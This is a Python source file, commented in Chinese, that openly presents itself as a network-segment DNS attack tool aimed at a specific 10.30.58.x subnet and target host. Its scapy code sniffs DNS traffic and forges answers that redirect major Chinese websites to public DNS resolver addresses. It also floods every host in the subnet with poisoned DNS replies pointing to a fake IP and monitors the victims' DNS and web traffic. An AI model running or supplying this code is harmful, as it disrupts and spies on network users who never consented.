#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
网络段级DNS攻击工具
针对整个网络段进行攻击，影响目标所在网段
"""

import threading
import time
from scapy.all import *

class NetworkSegmentAttack:
    def __init__(self):
        self.attack_running = False
        self.spoof_count = 0
        self.network_segment = "10.30.0.0/16"  # 整个10.30.x.x网段
        
        # 国内平台重定向规则
        self.china_platforms = {
            # 电视平台
            "iqiyi.com": "1.1.1.1",           # 爱奇艺 -> Cloudflare
            "youku.com": "8.8.8.8",           # 优酷 -> 谷歌DNS
            "bilibili.com": "8.8.8.8",       # B站 -> 谷歌DNS
            "douyin.com": "208.67.222.222",   # 抖音 -> OpenDNS
            "kuaishou.com": "1.1.1.1",       # 快手 -> Cloudflare
            
            # 搜索引擎
            "baidu.com": "8.8.8.8",          # 百度 -> 谷歌DNS
            "sogou.com": "1.1.1.1",          # 搜狗 -> Cloudflare
            "so.com": "208.67.222.222",      # 360搜索 -> OpenDNS
            
            # 传媒平台
            "sina.com.cn": "8.8.8.8",        # 新浪 -> 谷歌DNS
            "sohu.com": "1.1.1.1",           # 搜狐 -> Cloudflare
            "163.com": "208.67.222.222",     # 网易 -> OpenDNS
            "qq.com": "8.8.8.8",             # 腾讯网 -> 谷歌DNS
            
            # 电商平台
            "taobao.com": "8.8.8.8",         # 淘宝 -> 谷歌DNS
            "jd.com": "208.67.222.222",      # 京东 -> OpenDNS
            "pinduoduo.com": "8.8.8.8",      # 拼多多 -> 谷歌DNS
            
            # 社交平台
            "weibo.com": "1.1.1.1",          # 微博 -> Cloudflare
            "zhihu.com": "208.67.222.222",   # 知乎 -> OpenDNS
            "toutiao.com": "8.8.8.8",        # 今日头条 -> 谷歌DNS
        }
    
    def network_analysis(self):
        """网络分析"""
        print("🔍 网络段分析")
        print("=" * 50)
        
        # 获取本机信息
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        print(f"本机IP: {local_ip}")
        print(f"攻击网段: {self.network_segment}")
        print(f"目标所在网段: 10.30.58.x")
        
        # 分析网络拓扑
        local_segment = '.'.join(local_ip.split('.')[:3])
        target_segment = '10.30.58'
        
        if local_segment == target_segment:
            print("✅ 同一网络段")
        else:
            print(f"❌ 不同网络段: {local_segment} vs {target_segment}")
            print("💡 存在VLAN隔离，但DNS攻击仍可影响整个网段")
    
    def segment_dns_spoofing(self):
        """网络段DNS欺骗"""
        print(f"🎯 启动网络段DNS欺骗 (网段: {self.network_segment})")
        
        def segment_spoof(pkt):
            if pkt.haslayer(DNSQR):
                # 只处理10.30.x.x网段的DNS查询
                if pkt.haslayer(IP) and pkt[IP].src.startswith("10.30."):
                    domain = pkt[DNS].qd.qname.decode('utf-8', errors='ignore').rstrip('.')
                    
                    # 检查是否在国内平台列表中
                    redirect_ip = None
                    platform_type = "其他"
                    
                    for platform, ip in self.china_platforms.items():
                        if platform in domain:
                            redirect_ip = ip
                            
                            # 分类平台类型
                            if "iqiyi" in platform or "youku" in platform or "bilibili" in platform:
                                platform_type = "电视平台"
                            elif "baidu" in platform or "sogou" in platform:
                                platform_type = "搜索引擎"
                            elif "sina" in platform or "sohu" in platform or "163" in platform:
                                platform_type = "传媒平台"
                            elif "taobao" in platform or "jd" in platform:
                                platform_type = "电商平台"
                            elif "weibo" in platform or "zhihu" in platform:
                                platform_type = "社交平台"
                            
                            break
                    
                    # 创建DNS响应
                    if redirect_ip:
                        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                                     UDP(dport=pkt[UDP].sport, sport=53)/\
                                     DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                         an=DNSRR(rrname=pkt[DNS].qd.qname, type='A', 
                                                 ttl=600, rdata=redirect_ip))
                        
                        send(spoofed_pkt, verbose=False)
                        
                        self.spoof_count += 1
                        
                        # 显示源IP和攻击效果
                        src_ip = pkt[IP].src
                        
                        if platform_type == "电视平台":
                            print(f"🌐 [{src_ip}] 电视平台拦截: {domain} -> {redirect_ip}")
                        elif platform_type == "搜索引擎":
                            print(f"🌐 [{src_ip}] 搜索引擎重定向: {domain} -> {redirect_ip}")
                        elif platform_type == "传媒平台":
                            print(f"🌐 [{src_ip}] 传媒平台拦截: {domain} -> {redirect_ip}")
                        elif platform_type == "电商平台":
                            print(f"🌐 [{src_ip}] 电商平台重定向: {domain} -> {redirect_ip}")
                        elif platform_type == "社交平台":
                            print(f"🌐 [{src_ip}] 社交平台拦截: {domain} -> {redirect_ip}")
                        else:
                            print(f"🌐 [{src_ip}] DNS欺骗: {domain} -> {redirect_ip}")
                        
                        # 统计显示
                        if self.spoof_count % 15 == 0:
                            print(f"📊 网络段攻击统计: 已欺骗 {self.spoof_count} 个DNS查询")
        
        try:
            # 监听整个10.30.x.x网段的DNS流量
            sniff(filter="udp port 53 and net 10.30.0.0/16", prn=segment_spoof, store=0)
        except Exception as e:
            print(f"❌ 网络段DNS欺骗失败: {e}")
    
    def active_dns_poisoning(self):
        """主动DNS投毒（向整个网段发送虚假DNS响应）"""
        print(f"🎯 启动主动DNS投毒 (网段: {self.network_segment})")
        
        def send_poison_to_segment():
            poison_count = 0
            popular_domains = [
                "www.baidu.com", "www.taobao.com", "www.qq.com",
                "www.sina.com.cn", "www.sohu.com", "www.163.com",
                "www.weibo.com", "www.zhihu.com", "www.bilibili.com"
            ]
            
            while self.attack_running and poison_count < 50:
                try:
                    import random
                    domain = random.choice(popular_domains)
                    
                    # 向整个网段广播虚假DNS响应
                    for i in range(1, 255):  # 遍历10.30.x.x网段
                        target_ip = f"10.30.58.{i}"  # 重点攻击目标所在子网
                        
                        # 创建虚假DNS响应
                        poisoned_pkt = IP(dst=target_ip, src="8.8.8.8")/\
                                      UDP(dport=53, sport=53)/\
                                      DNS(id=random.randint(1000, 9999), qr=1, aa=1, 
                                          qd=DNSQR(qname=domain),
                                          an=DNSRR(rrname=domain, type='A', 
                                                  ttl=300, rdata="1.2.3.4"))  # 虚假IP
                        
                        send(poisoned_pkt, verbose=False)
                    
                    poison_count += 1
                    
                    if poison_count % 10 == 0:
                        print(f"☠️  主动DNS投毒: 已发送 {poison_count} 轮虚假响应")
                    
                    time.sleep(5)  # 每5秒发送一轮
                    
                except Exception as e:
                    print(f"❌ DNS投毒失败: {e}")
                    time.sleep(10)
        
        poison_thread = threading.Thread(target=send_poison_to_segment)
        poison_thread.daemon = True
        poison_thread.start()
    
    def monitor_network_traffic(self):
        """监控网络段流量"""
        print(f"🔍 监控网络段 {self.network_segment} 流量...")
        
        def traffic_analyzer(pkt):
            if pkt.haslayer(IP) and pkt[IP].src.startswith("10.30."):
                src_ip = pkt[IP].src
                
                # 重点监控目标所在子网
                if src_ip.startswith("10.30.58"):
                    if pkt.haslayer(DNSQR):
                        domain = pkt[DNS].qd.qname.decode('utf-8', errors='ignore').rstrip('.')
                        print(f"🎯 目标子网DNS查询 [{src_ip}]: {domain}")
                    elif pkt.haslayer(TCP):
                        if pkt[TCP].dport == 80:
                            print(f"🎯 目标子网HTTP访问 [{src_ip}]: 端口 80")
                        elif pkt[TCP].dport == 443:
                            print(f"🎯 目标子网HTTPS访问 [{src_ip}]: 端口 443")
        
        try:
            # 监控整个网段流量
            sniff(filter="net 10.30.0.0/16", prn=traffic_analyzer, store=0, count=100)
        except Exception as e:
            print(f"❌ 流量监控失败: {e}")
    
    def run_segment_attack(self):
        """运行网络段攻击"""
        print("=" * 70)
        print("          网络段级DNS攻击工具")
        print("=" * 70)
        
        # 网络分析
        self.network_analysis()
        
        print(f"\n💡 目标设备 10.30.58.185 不在线")
        print("💡 采用网络段级攻击策略")
        print("💡 影响整个10.30.x.x网段，包括目标所在子网")
        
        self.attack_running = True
        
        # 创建攻击线程
        threads = []
        
        # 网络段DNS欺骗
        t1 = threading.Thread(target=self.segment_dns_spoofing)
        threads.append(t1)
        
        # 主动DNS投毒
        t2 = threading.Thread(target=self.active_dns_poisoning)
        threads.append(t2)
        
        # 流量监控
        t3 = threading.Thread(target=self.monitor_network_traffic)
        threads.append(t3)
        
        # 启动所有线程
        for t in threads:
            t.daemon = True
            t.start()
        
        print("\n⏰ 网络段攻击运行中...")
        print("💡 按 Ctrl+C 停止攻击")
        print("\n攻击策略:")
        print("🌐 网络段DNS欺骗 (影响整个10.30.x.x网段)")
        print("☠️  主动DNS投毒 (向目标子网发送虚假响应)")
        print("🔍 流量监控 (重点监控10.30.58.x子网)")
        print("💡 即使目标不在线，也能影响其所在网络环境")
        
        try:
            while self.attack_running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_attack()
        
        print("\n✅ 网络段攻击已停止")
        print(f"📊 总共欺骗了 {self.spoof_count} 个DNS查询")
    
    def stop_attack(self):
        """停止攻击"""
        self.attack_running = False
        print("\n🛑 停止网络段攻击")

def main():
    """主函数"""
    import socket
    
    attack = NetworkSegmentAttack()
    
    try:
        attack.run_segment_attack()
    except KeyboardInterrupt:
        attack.stop_attack()
    except Exception as e:
        print(f"❌ 攻击失败: {e}")

if __name__ == "__main__":
    main()